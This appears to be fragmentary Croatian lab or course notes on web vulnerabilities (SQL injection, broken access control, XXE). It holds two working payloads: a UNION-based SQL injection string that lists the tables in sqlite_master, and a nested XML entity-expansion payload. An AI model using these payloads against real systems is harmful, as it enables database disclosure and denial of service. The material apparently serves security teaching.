https://...
SQL umetanje (SQL Injection), Loša kontrola pristupa (Broken Access Control), Vanjski XML entiteti (XML External Entity, XXE)
upute...


tower' or 0=0 union SELECT * FROM sqlite_master;--

<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY bar "World ">
<!ENTITY t1 "&bar;&bar;">
<!ENTITY t2 "&t1;&t1;&t1;&t1;">
<!ENTITY t3 "&t2;&t2;&t2;&t2;&t2;">
]>
<foo>
Hello &t3;
</foo>